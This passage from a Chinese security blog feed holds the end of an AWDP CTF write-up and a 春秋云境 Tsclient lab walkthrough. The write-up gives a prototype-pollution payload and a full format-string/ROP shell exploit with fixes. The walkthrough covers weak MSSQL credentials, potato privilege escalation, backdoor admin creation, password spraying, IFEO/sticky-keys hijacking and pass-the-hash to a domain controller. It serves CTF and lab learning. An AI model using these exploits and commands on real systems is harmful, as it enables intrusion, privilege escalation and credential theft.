class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="hljs-property">price</span> * quantity) &#123;<br>      money -= products[productIndex].<span class="hljs-property">price</span> * quantity;<br>      message = <span class="hljs-string">`成功购买了 <span class="hljs-subst">$&#123;quantity&#125;</span> 件 &quot;<span class="hljs-subst">$&#123;products[productIndex].name&#125;</span>&quot;！`</span>;<br><br>      <span class="hljs-comment">// 使用 JavaScript 弹窗来显示购买成功消息</span><br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="hljs-attr">showAlert</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      message = <span class="hljs-string">&#x27;购买失败，钱不够啊老铁.&#x27;</span>;<br>      res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> object1 !== <span class="hljs-string">&#x27;object&#x27;</span> || object1 === <span class="hljs-literal">null</span> ||<br>      <span class="hljs-keyword">typeof</span> object2 !== <span class="hljs-string">&#x27;object&#x27;</span> || object2 === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>    <span class="hljs-keyword">if</span> (<br>      <span class="hljs-keyword">typeof</span> object2[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp;<br>      object2[key] !== <span class="hljs-literal">null</span> &amp;&amp;<br>      <span class="hljs-keyword">typeof</span> object1[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp;<br>      object1[key] !== <span class="hljs-literal">null</span><br>    ) &#123;<br>      <span class="hljs-title function_">copy</span>(object1[key], object2[key]); <span class="hljs-comment">// ✅ 安全递归</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      object1[key] = object2[key]; <span class="hljs-comment">// ✅ 直接赋值</span><br>    &#125;<br>  &#125;<br>&#125;<br><br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/getflag&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(), <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">const</span> flagFilePath = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>  <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;&#x27;</span>;<br>  fs.<span class="hljs-title function_">readFile</span>(flagFilePath, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法读取文件: <span class="hljs-subst">$&#123;flagFilePath&#125;</span>`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      flag = data; <span class="hljs-comment">// 将文件内容赋值给flag变量</span><br>      <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>      <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>      <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>      <span class="hljs-title function_">copy</span>(user, req.<span class="hljs-property">body</span>);<br>      <span class="hljs-keyword">if</span> (secert.<span class="hljs-property">testattack</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        res.<span class="hljs-title function_">end</span>(flag);<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;no,no,no!&quot;</span>);<br>      &#125;<br>    &#125;<br>  &#125;);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/reset&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  money = initialMoney;<br>  message = <span class="hljs-string">&#x27;&#x27;</span>;<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server is running on http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>Node.js污染</p><p>secert 是个空对象，但它和 user 在同一作用域下，需要控制 req.body 中的内容，污染secret</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;testattack&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/readfile&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> fileName = req.<span class="hljs-property">body</span>.<span class="hljs-property">fileName</span>;<br><br>  <span class="hljs-keyword">if</span> (fileName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;fl&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;你还真读flag啊&#x27;</span>);<br>  &#125;<br>  <span class="hljs-comment">// 阻止读取源码</span><br>  <span class="hljs-keyword">if</span> (fileName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;ap&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;你还真读app.js啊&#x27;</span>);<br>  &#125;<br>  <span class="hljs-comment">// 读取文件内容</span><br>  fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&quot;/app/public/&quot;</span>+fileName, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error reading the file&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(data);<br>    &#125;<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/buy/:productIndex&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> productIndex = req.<span class="hljs-property">params</span>.<span class="hljs-property">productIndex</span>;<br>  <span class="hljs-keyword">let</span> quantity = req.<span class="hljs-property">query</span>.<span class="hljs-property">quantity</span> || <span class="hljs-number">1</span>; <span class="hljs-comment">// 获取购买数量，默认为1</span><br><br>  <span class="hljs-keyword">if</span> (productIndex === <span class="hljs-string">&#x27;3&#x27;</span>) &#123;<br>    quantity = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(quantity); <span class="hljs-comment">// 取绝对值</span><br>    <span class="hljs-keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="hljs-property">price</span> * quantity) &#123;<br>      money -= products[productIndex].<span class="hljs-property">price</span> * quantity;<br>      message = <span class="hljs-string">`购买flag成功啦！给你/showflag这个路由，听说那里面有flag`</span>;<br><br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="hljs-attr">showAlert</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      message = <span class="hljs-string">&#x27;flag很贵的&#x27;</span>;<br>      res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 模仿上面对数量做绝对值，防止购买负数增加金钱</span><br>    quantity = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(quantity); <span class="hljs-comment">// 取绝对值</span><br>    <span class="hljs-keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="hljs-property">price</span> * quantity) &#123;<br>      money -= products[productIndex].<span class="hljs-property">price</span> * quantity;<br>      message = <span class="hljs-string">`成功购买了 <span class="hljs-subst">$&#123;quantity&#125;</span> 件 &quot;<span class="hljs-subst">$&#123;products[productIndex].name&#125;</span>&quot;！`</span>;<br><br>      <span class="hljs-comment">// 使用 JavaScript 弹窗来显示购买成功消息</span><br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="hljs-attr">showAlert</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      message = <span class="hljs-string">&#x27;购买失败，钱不够啊老铁.&#x27;</span>;<br>      res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> object1 !== <span class="hljs-string">&#x27;object&#x27;</span> || object1 === <span class="hljs-literal">null</span> ||<br>      <span class="hljs-keyword">typeof</span> object2 !== <span class="hljs-string">&#x27;object&#x27;</span> || object2 === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>    <span class="hljs-comment">// 过滤原型链污染常用字符串</span><br>    <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;outputFunctionName&#x27;</span> || key === <span class="hljs-string">&#x27;__proto__&#x27;</span> || key === <span class="hljs-string">&#x27;constructor&#x27;</span> || key === <span class="hljs-string">&#x27;prototype&#x27;</span> || key === <span class="hljs-string">&#x27;return&#x27;</span> || key === <span class="hljs-string">&#x27;global&#x27;</span> || key === <span class="hljs-string">&#x27;process&#x27;</span> || key === <span class="hljs-string">&#x27;mainModule&#x27;</span> || key === <span class="hljs-string">&#x27;constructor&#x27;</span> || key === <span class="hljs-string">&#x27;child&#x27;</span> || key === <span class="hljs-string">&#x27;execSync&#x27;</span> || key === <span class="hljs-string">&#x27;escapeFunction&#x27;</span> || key === <span class="hljs-string">&#x27;client&#x27;</span> || key === <span class="hljs-string">&#x27;compileDebug&#x27;</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<br>      <span class="hljs-keyword">typeof</span> object2[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp;<br>      object2[key] !== <span class="hljs-literal">null</span> &amp;&amp;<br>      <span class="hljs-keyword">typeof</span> object1[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp;<br>      object1[key] !== <span class="hljs-literal">null</span><br>    ) &#123;<br>      <span class="hljs-title function_">copy</span>(object1[key], object2[key]); <span class="hljs-comment">// ✅ 安全递归</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      object1[key] = object2[key]; <span class="hljs-comment">// ✅ 直接赋值</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn-Cake-shop"><a href="#pwn-Cake-shop" class="headerlink" title="[pwn] Cake_shop"></a>[pwn] Cake_shop</h1><h2 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h2><p>存在格式化字符串</p><p><img src="/img/wp/2025/ningbo-5.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nothing</span>(<span class="hljs-params">data</span>):<br>  p.sendlineafter(<span class="hljs-string">b&#x27;choice&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">b&#x27;happens&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">num,data</span>):<br>  p.sendlineafter(<span class="hljs-string">b&#x27;choice&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">b&#x27;cake $100&#x27;</span>,<span class="hljs-built_in">str</span>(num).encode())<br>  p.sendlineafter(<span class="hljs-string">b&#x27;shop&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;10.1.108.15&#x27;</span>,<span class="hljs-number">9999</span>)<br>payload=<span class="hljs-string">b&quot;aaa%15$p %13$p %17$pbbb&quot;</span><br>nothing(payload)<br>p.readuntil(<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>d0,d1,d2=p.readuntil(<span class="hljs-string">b&#x27;bbb&#x27;</span>,drop=<span class="hljs-number">1</span>).split(<span class="hljs-string">b&#x27; &#x27;</span>)<br>elf_addr=<span class="hljs-built_in">int</span>(d1,<span class="hljs-number">16</span>)<br>libc_addr=<span class="hljs-built_in">int</span>(d2,<span class="hljs-number">16</span>)<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>e.address=elf_addr-<span class="hljs-number">0x156a</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc.address=libc_addr-<span class="hljs-number">0x24083</span><br><br>index=<span class="hljs-number">3</span>+<span class="hljs-number">6</span><br>a_addr=<span class="hljs-number">0x4010</span>+e.address<br>payload=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0xe0ff</span>)+<span class="hljs-string">&quot;c%9$hn%&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span>-<span class="hljs-number">0xe0ff</span>+<span class="hljs-number">0x5f5</span>)+<span class="hljs-string">&quot;c%10$hn&quot;</span><br>payload=payload.ljust(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;a&#x27;</span>).encode()<br><span class="hljs-built_in">print</span>(payload)<br>payload+=p64(a_addr)+p64(a_addr+<span class="hljs-number">2</span>)<br>nothing(payload)<br>payload=<span class="hljs-string">&quot;%25600c%9$n&quot;</span>.ljust(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;a&#x27;</span>).encode()<br>payload+=p64(<span class="hljs-number">0x4014</span>+e.address)<br>nothing(payload)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>num=<span class="hljs-number">666</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;cake $100&#x27;</span>,<span class="hljs-built_in">str</span>(num).encode())<br><br>canary=<span class="hljs-built_in">int</span>(d0,<span class="hljs-number">16</span>)<br>rdi=libc.address+<span class="hljs-number">0x23b6a</span><br>ret=rdi+<span class="hljs-number">1</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))<br>system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(canary)+p64(<span class="hljs-number">0xbfbfbfbf</span>)<br>payload+=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>p.send(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h2><p>修改使用puts进行输出，成功修复</p><p><img src="/img/wp/2025/ningbo-6.png"></p><h1 id="pwn-stu-admin"><a href="#pwn-stu-admin" class="headerlink" title="[pwn] stu_admin"></a>[pwn] stu_admin</h1><h2 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h2><p>edit功能存在堆溢出，溢出了16字节</p><p><img src="/img/wp/2025/ningbo-7.png"></p><p>修复溢出</p><p><img src="/img/wp/2025/ningbo-8.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体难度比往年都要简单，就是搞不懂为什么check的轮次这么少，只有两轮，而且不返回check的结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;队友太强了，break rank1，fix rank4&lt;/p&gt;
&lt;h1 id=&quot;web-easyUpload&quot;&gt;&lt;a href=&quot;#web-easyUpload&quot; class=&quot;headerlink&quot; title=&quot;[web] easyUpload&quot;&gt;&lt;/a&gt;[web] e</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="awdp" scheme="https://www.dr0n.top/tags/awdp/"/>
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="宁波" scheme="https://www.dr0n.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
    <category term="2025竞赛" scheme="https://www.dr0n.top/tags/2025%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>春秋云境 Tsclient</title>
    <link href="https://www.dr0n.top/posts/51676235/"/>
    <id>https://www.dr0n.top/posts/51676235/</id>
    <published>2025-08-26T08:00:00.000Z</published>
    <updated>2025-08-28T11:41:48.223Z</updated>
    
    <content type="html"><![CDATA[<p>依旧白嫖</p><blockquote><p>Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。</p></blockquote><p>前置知识:</p><p><a href="/posts/52375b43/">内网渗透学习(代理篇)</a><br><a href="/posts/3f5b8fbe/">域渗透学习(NTLM篇)</a><br><a href="/posts/a04618bd/">windows提权笔记</a></p><h1 id="入口（172-22-8-18）"><a href="#入口（172-22-8-18）" class="headerlink" title="入口（172.22.8.18）"></a>入口（172.22.8.18）</h1><p>访问主机，是一个iis页面，没有明显的框架和服务可以利用</p><p>扫描端口</p><p><code>fscan.exe -h 39.99.147.95</code></p><p>开启了mssql服务，同时爆出了弱口令 sa&#x2F;1qaz!QAZ</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-1.png"></p><p>MDUT连接上，激活xpcmdshell组件执行命令，发现权限较低</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-2.png"></p><p>上传 SweetPotato 提权</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-3.png"></p><p>提权后上线cs</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-4.png"></p><p>得到flag1：<code>flag&#123;9147508f-baf0-4602-b4b2-3fe74b39fb86&#125;</code><br>和一个hint：<code>Maybe you should focus on user sessions...</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-5.png"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>然后收集信息</p><p>ip是172.22.8.18</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-6.png"></p><p>还有一个用户john，恰巧在线</p><blockquote><p><code>quser || qwinst</code> 命令查看在线用户</p></blockquote><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-7.png"></p><p>根据提示使用cs的进程注入，上线John</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-8.png"></p><p>查看网络连接状态</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-9.png"></p><p>查看共享内容，得到一个密码和hint</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br><br>Do you know how to hijack Image?<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-10.png"></p><p>这里为了操作方便创建了一个用户来远程登录windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user dr0n1 Qwer1234! /add<br>net localgroup administrators dr0n1 /add<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure><p>上传fscan扫c段</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-11.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">172.22.8.15:3389 open<br>172.22.8.31:3389 open<br>172.22.8.46:3389 open<br>172.22.8.18:3389 open<br><br>172.22.8.15 XIAORANG\DC01 <span class="hljs-comment"># 域控</span><br>172.22.8.31 XIAORANG\WIN19-CLIENT<br>172.22.8.46 WIN2016.xiaorang.lab<br>172.22.8.18 WIN-WEB <span class="hljs-comment"># 本机</span><br></code></pre></td></tr></table></figure><p>构建代理</p><p><code>C:\a&gt;iox.exe proxy -l 5588</code></p><h2 id="域主机（172-22-8-46）"><a href="#域主机（172-22-8-46）" class="headerlink" title="域主机（172.22.8.46）"></a>域主机（172.22.8.46）</h2><p>这里主机不多，使用rdesktop一个一个尝试登录，登录46时会提示密码过期需要修改，改完就能登上了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 rdesktop 172.22.8.46<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">xiaorang\Aldrich<br>Ald@rLMWuy7Z!#<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-13.png"></p><hr><p>看网上的wp是说可以用crackmapexec喷洒密码</p><p><code>proxychains4 crackmapexec smb 172.22.8.0/24 -u &#39;Aldrich&#39; -p &#39;Ald@rLMWuy7Z!#&#39; -d xiaorang.lab 2&gt;/dev/null</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-12.png"></p><p>然后有提示<code>STATUS_PASSWORD_EXPIRED</code> 就是密码过期了，需要使用<a href="https://github.com/fortra/impacket">smbpasswd</a>进行修改密码</p><p><code>python3 smbpasswd.py xiaorang.lab/Aldrich:&#39;Ald@rLMWuy7Z!#&#39;@172.22.8.15 -newpass &#39;Qwer1234!&#39;</code></p><hr><p>根据前面的提示 <code>hijack Image</code></p><p>rdp登上后先查看权限，发现所有正常登录的用户都可以修改注册表</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-acl</span> -<span class="hljs-string">path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="hljs-string">fl</span> *<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-14.png"></p><p>修改注册表，把主页的放大镜(magnify.exe)替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span><br><br><span class="hljs-comment"># 粘滞键方式，五次shift触发</span><br>REG ADD <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure><p>锁屏后点击右小角的放大镜</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-15.png"></p><p>就直接是system权限了，然后触发提前准备好的马(cs 转发上线)</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-16.png"></p><p>上线cs，拿到flag2</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-17.png"></p><h2 id="域控（172-22-8-15）"><a href="#域控（172-22-8-15）" class="headerlink" title="域控（172.22.8.15）"></a>域控（172.22.8.15）</h2><p>查看域管成员</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-18.png"></p><p>logonpaswords抓到win2016$的哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-19.png"></p><p>pth域控，拿到flag3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 